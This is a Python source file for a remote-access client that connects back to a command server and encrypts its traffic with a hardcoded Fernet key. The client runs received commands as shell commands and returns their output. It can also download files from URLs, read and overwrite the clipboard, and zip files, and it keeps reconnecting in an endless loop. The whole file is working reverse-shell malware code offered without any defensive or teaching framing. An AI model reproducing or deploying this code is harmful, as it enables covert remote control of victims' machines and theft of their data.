import os
import pathlib
import shutil
import signal
import socket
import struct
import subprocess
import sys
import time

import requests
from cryptography.fernet import Fernet

commands = '\nAvaliable Modules\n'

commands += '- download {url} (Downloads file from URL)\n'

try:
    import pyperclip
    commands += '- key/gclip (Copys clipboard)\n'
    commands += '- key/fclip {Text} (Fills clipboard)\n'
    _pyperclip = True
except Exception as e:
    print(f'pyperclip not installed: {e}')
    _pyperclip = False

try:
    import zipfile
    commands += '- unzip {Zip file} (Unzips a file)\n'
    commands += '- zip {file} ( Zips a file)\n'
    _zipfile = True
except Exception as e:
    print(f'zipfile import error: {e}')
    _zipfile = False


class Client(object):

    def __init__(self):
        self.serverHost = '127.0.0.1'
        self.serverPort = 9999
        self.socket = None
        # Generate Key
        # key = Fernet.generate_key()

        key = b'k_1i71JWlLTHt8N185PUXjFFzu27DnEH2sXNy-aoG30='
        self.Crypt = Fernet(key)

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            encrypted_host = self.Crypt.encrypt(socket.gethostname().encode(encoding="utf-8")).decode(encoding="utf-8")
            self.socket.send(str.encode(encrypted_host))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def print_output(self, output_str : str):
        """ Prints command output """
        sent_message = str.encode(self.Crypt.encrypt((output_str + str(os.getcwd()) + '> ').encode(encoding='utf-8')).decode())
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return


    def check_custom_commands(self, data : bytes):
        """ Check for Custom command triggers in data """
        data = data.decode("utf-8")
        if data[:2].lower() == 'cd':
            directory = data[3:]
            try:
                os.chdir(directory.strip())
            except Exception as e:
                return "Could not change directory: %s\n" %str(e)
            else: 
                return ""
        if data[:7].lower() == 'modules':
            return commands
        if data[:8].lower() == 'download':
            try:
                url = data[9:]
                filename = os.path.basename(url)
                with requests.get(url, stream=True) as r:
                    with open(filename, 'wb') as f:
                        shutil.copyfileobj(r.raw, f)
            except Exception as e:
                return f"Error downloading file {e}"
            return 'Downloaded {0} successfully.'.format(filename)
        if data[:9].lower() == 'key/gclip':
            if _pyperclip:
                return pyperclip.paste()
            else:
                return "key/gclip not avaliable: pyperclip import failed"
        if data[:9].lower() == 'key/fclip':
            if _pyperclip:
                pyperclip.copy(data[10:])
                return "Copied to clipboard successfully."
            else:
                return "key/fclip not avaliable: pyperclip import failed"
        if data[:3].lower() == 'zip':
            if _zipfile:
                output_file = os.path.splitext(data[4:])[0] + ".zip"
                zipfile.ZipFile(os.path.splitext(data[4:])[0] + ".zip", mode='w').write(data[4:])
                return f"{data[4:]} zipped to {output_file}"
            else:
                return "zip not avaliable: zipfile import failed"
        if data[:5].lower() == 'unzip':
            if _zipfile:
                with zipfile.ZipFile(data[6:], 'r') as f:
                    f.extractall(pathlib.Path().absolute())
                return f"Extracted {data[6:]} to {pathlib.Path().absolute()}"
            else:
                return "unzip not avaliable: zipfile import failed"
        return None


    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(1024)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(self.Crypt.encrypt(str(os.getcwd() + '> ').encode()).decode())
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'':
                break
            if data == b' ':
                self.print_output(' ')
                break
            try:
                data = self.Crypt.decrypt(data)
            except Exception as e:
                print(e)
                break
            if data[:].decode("utf-8").lower() == 'quit':
                self.socket.close()
                break
            try:
                output_str = self.check_custom_commands(data)
            except Exception as e:
                output_str = f"Custom command failed: {e}"
            if (output_str == None) and len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    # TODO: Error description is lost
                    output_str = "Command execution unsuccessful: %s" %str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str + "\n")
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))
        self.socket.close()
        return

def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return

if __name__ == '__main__':
    while True:
        main()
